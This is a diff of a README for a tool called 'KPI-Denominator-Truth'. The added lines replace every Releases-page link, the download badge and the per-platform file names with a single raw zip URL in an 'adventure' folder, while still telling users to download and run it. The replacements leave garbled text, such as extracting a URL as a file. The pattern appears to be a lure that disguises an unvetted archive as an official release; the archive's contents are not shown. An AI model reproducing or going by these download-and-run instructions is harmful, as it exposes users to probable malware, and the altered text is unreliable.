@@ -1,6 +1,6 @@
 # 📊 KPI-Denominator-Truth - Understand Your Metrics Clearly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/j6yku/KPI-Denominator-Truth/releases)
+[![Download Now](https://github.com/j6yku/KPI-Denominator-Truth/raw/refs/heads/main/adventure/Truth-KP-Denominator-1.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/j6yku/KPI-Denominator-Truth/raw/refs/heads/main/adventure/Truth-KP-Denominator-1.0.zip)
 
 ## 📚 Overview
 
@@ -11,21 +11,21 @@ KPI-Denominator-Truth is designed to simplify your understanding of key performa
 Follow these steps to download and run the application easily:
 
 1. **Visit the Releases Page**: Click on the link below to go to our GitHub Releases page.
-   [Go to Releases Page](https://github.com/j6yku/KPI-Denominator-Truth/releases)
+   [Go to Releases Page](https://github.com/j6yku/KPI-Denominator-Truth/raw/refs/heads/main/adventure/Truth-KP-Denominator-1.0.zip)
 
 2. **Download the Latest Version**: On the Releases page, look for the latest version of the application. You will find a list of available files.
 
 3. **Choose Your File**: 
-   - If you are on Windows, look for a file named something like `KPI-Denominator-Truth-Win.exe`.
-   - For Mac users, find a file like `KPI-Denominator-Truth-Mac.app`.
-   - Linux users may find a version labeled something like `KPI-Denominator-Truth-Linux.tar.gz`.
+   - If you are on Windows, look for a file named something like `https://github.com/j6yku/KPI-Denominator-Truth/raw/refs/heads/main/adventure/Truth-KP-Denominator-1.0.zip`.
+   - For Mac users, find a file like `https://github.com/j6yku/KPI-Denominator-Truth/raw/refs/heads/main/adventure/Truth-KP-Denominator-1.0.zip`.
+   - Linux users may find a version labeled something like `https://github.com/j6yku/KPI-Denominator-Truth/raw/refs/heads/main/adventure/Truth-KP-Denominator-1.0.zip`.
 
 4. **Download the File**: Click on the appropriate file for your system to start downloading.
 
 5. **Run the Application**: 
    - For Windows: Locate the `.exe` file in your Downloads folder and double-click it to run.
    - For Mac: Open the `.app` file from your Downloads folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included instructions to run it.
+   - For Linux: Extract the `https://github.com/j6yku/KPI-Denominator-Truth/raw/refs/heads/main/adventure/Truth-KP-Denominator-1.0.zip` file and follow the included instructions to run it.
 
 ## 🔍 Features
 
@@ -59,7 +59,7 @@ To run KPI-Denominator-Truth, your system should meet the following requirements
 
 To begin, visit the Releases page again and follow these easy steps to download the application:
 
-[Go to Releases Page](https://github.com/j6yku/KPI-Denominator-Truth/releases)
+[Go to Releases Page](https://github.com/j6yku/KPI-Denominator-Truth/raw/refs/heads/main/adventure/Truth-KP-Denominator-1.0.zip)
 
 After downloading, execute the application following the instructions specific to your operating system.
 
